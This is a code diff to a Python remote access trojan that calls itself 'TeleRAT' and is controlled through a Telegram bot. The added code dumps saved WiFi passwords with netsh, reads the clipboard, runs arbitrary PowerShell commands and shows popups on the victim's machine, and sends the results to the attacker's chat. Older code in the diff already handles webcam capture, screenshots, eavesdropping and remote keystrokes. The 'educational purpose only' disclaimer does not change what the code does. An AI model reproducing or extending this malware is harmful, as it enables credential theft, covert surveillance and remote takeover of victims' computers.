@@ -1,3 +1,4 @@
+import ctypes
 import sys
 import webbrowser
 import psutil
@@ -16,6 +17,7 @@ import platform
 import subprocess
 import autopy
 import random
+import clipboard
 
 '''
 This Program is only for educational purpose only I am not responsible how this program is used
@@ -28,12 +30,11 @@ Thank you for using this project !
 
 '''
 
-
 username = getpass.getuser() # To get USERNAME of the PC
 telegram_parsing_mode = ParseMode.HTML
 
 my_id = '<Replace With Your Chat ID>' # Enter Your Chat ID
-bot_api = '<Replace With Your Telegram BOT ID>' # Enter your Telegram BOT Api
+bot_api = '<Replace With Your BOT Api>' # Enter your Telegram BOT Api
 
 ip = requests.get("http://ip-api.com/json/").json() # Getting Public IP details in Json Format
 
@@ -51,7 +52,7 @@ def listToString(s):
 
 updater = Updater(bot_api, use_context=True)
 dispatcher = updater.dispatcher
-dispatcher.bot.send_message(chat_id=my_id,text=username+" Connected")
+dispatcher.bot.send_message(chat_id=my_id,text="☠️ "+username+" Connected")
 
 def webcam_taker():
     camera = cv2.VideoCapture(0)
@@ -158,7 +159,7 @@ def shell_commands(update,context):
 
     inputs = (update.message.text).split()
     command = listToString(inputs[1:])
-    cmd_output = subprocess.Popen(f"{command}", shell=True, stdout=subprocess.PIPE)
+    cmd_output = subprocess.Popen(f"powershell.exe {command}", shell=True, stdout=subprocess.PIPE)
     dispatcher.bot.send_message(chat_id=my_id,text=cmd_output.stdout.read().decode(sys.stdout.encoding))
 
 
@@ -175,25 +176,53 @@ def send_keypress(update,context):
     keypress = listToString(inputs[1:])
     autopy.key.type_string(keypress)
 
+def show_popup(update,context):
+    inputs = (update.message.text).split()
+    Message = listToString(inputs[1:])
+    ctypes.windll.user32.MessageBoxW(0, Message, "TeleRAT!", 0x30)
 
+def get_clipboard():
+    dispatcher.bot.send_message(chat_id=my_id, text=f"<b>------Contents in Clipboard-----</b>\n\n{clipboard.paste()}",parse_mode=telegram_parsing_mode)
+
+def get_wifi_password():
+    wifi_passwords = []
+    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
+    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
+    for i in profiles:
+        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split(
+            '\n')
+        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
+        try:
+            wifi_passwords.append("{:<30}:  {:<}".format(i, results[0]))
+        except IndexError:
+            wifi_passwords.append("{:<30}:  {:<}".format(i, ""))
+
+    passwords_strings = " \n"
+
+    dispatcher.bot.send_message(chat_id=my_id,text=f"<b>------📶 WIFI Password-----</b>\n\n"
+                                                   f"{passwords_strings.join(wifi_passwords)}",parse_mode=telegram_parsing_mode)
 
 def main_menu(update,context):
 
-    keyboard = [[InlineKeyboardButton("Get IP", callback_data='Get_IP')],
-                 [InlineKeyboardButton("Get Screenshot", callback_data='get_Screenshot')],
-                [InlineKeyboardButton("Get Pic From Webcam", callback_data='get_Webcam')],
-                [InlineKeyboardButton("Eavesdrop",callback_data='eavesdrop')],
-                [InlineKeyboardButton("Text To Speech on client",callback_data='Speak')],
-                [InlineKeyboardButton("Send Message To Client",callback_data='sendMessage')],
-                [InlineKeyboardButton("Get System Information",callback_data='get_system_info')],
-                [InlineKeyboardButton("Perform Shell Commands",callback_data='shell_commands')],
-                [InlineKeyboardButton("Open Website",callback_data='open_website')],
-                [InlineKeyboardButton("Move mouse randomly and Slowly",callback_data='move_mouse')],
-                [InlineKeyboardButton("Type String",callback_data='send_keypress')]]
+    keyboard = [[InlineKeyboardButton("📟 Get IP", callback_data='Get_IP')],
+                 [InlineKeyboardButton("📸 Get Screenshot", callback_data='get_Screenshot')],
+                [InlineKeyboardButton("📷 Get Pic From Webcam", callback_data='get_Webcam')],
+                [InlineKeyboardButton("👂 Eavesdrop",callback_data='eavesdrop')],
+                [InlineKeyboardButton("🗣️ Text To Speech on client",callback_data='Speak')],
+                [InlineKeyboardButton("💬 Send Message To Client",callback_data='sendMessage')],
+                [InlineKeyboardButton("🖥️ Get System Information",callback_data='get_system_info')],
+                [InlineKeyboardButton("🔑 Perform Shell Commands",callback_data='shell_commands')],
+                [InlineKeyboardButton("🌐 Open Website",callback_data='open_website')],
+                [InlineKeyboardButton("🖲️ Move mouse randomly and Slowly",callback_data='move_mouse')],
+                [InlineKeyboardButton("⌨️ Type String",callback_data='send_keypress')],
+                [InlineKeyboardButton("⚠️ Show Alert Box with given message",callback_data='show_popup')],
+                [InlineKeyboardButton("📋 Get Clipboard",callback_data='get_clipboard')],
+                [InlineKeyboardButton("🗝️ Get Wifi Password",callback_data='get_wifi_password')]]
+
 
     reply_markup = InlineKeyboardMarkup(keyboard)
 
-    update.message.reply_text('Select a Payload :', reply_markup=reply_markup)
+    update.message.reply_text('Available Commands :', reply_markup=reply_markup)
 
 
 
@@ -243,6 +272,17 @@ def button(update, context):
         context.bot.send_message(chat_id=my_id,
                                  text="Use the command '/send_keypress <The string to send>' to type in client")
 
+    elif result == 'show_popup':
+        context.bot.send_message(chat_id=my_id,
+                                 text="Use the command '/show_popup <The message to show in alert box>' to show in client")
+
+    elif result == 'get_clipboard':
+        get_clipboard()
+
+    elif result == 'get_wifi_password':
+        get_wifi_password()
+
+
 
 updater.dispatcher.add_handler(CommandHandler('speak', speak))
 updater.dispatcher.add_handler(CommandHandler('send_message', msg_From_Server))
@@ -250,6 +290,7 @@ updater.dispatcher.add_handler(CommandHandler('commands',main_menu))
 updater.dispatcher.add_handler(CommandHandler('shell',shell_commands))
 updater.dispatcher.add_handler(CommandHandler('open_website',open_website))
 updater.dispatcher.add_handler(CommandHandler('send_keypress',send_keypress))
+updater.dispatcher.add_handler(CommandHandler('show_popup',show_popup))
 updater.dispatcher.add_handler(CallbackQueryHandler(button))
 updater.start_polling()
 updater.idle()
